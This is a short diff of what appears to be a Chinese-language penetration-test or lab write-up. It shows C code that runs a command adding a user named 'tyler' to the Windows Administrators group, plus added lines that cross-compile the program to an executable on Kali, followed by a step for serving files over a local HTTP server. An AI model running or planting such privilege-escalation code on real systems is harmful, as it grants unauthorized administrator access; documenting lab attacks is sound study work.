@@ -533,6 +533,9 @@ int main() {
   system("cmd.exe /c net localgroup Administrators tyler /add");
   return 0;
 }
+┌──(kali㉿kali)-[~/tools]
+└─$ x86_64-w64-mingw32-gcc-win32 spoofer-scheduler.c -o spoofer-scheduler.exe
+
 ```
 本機開 http.server
 ```bash
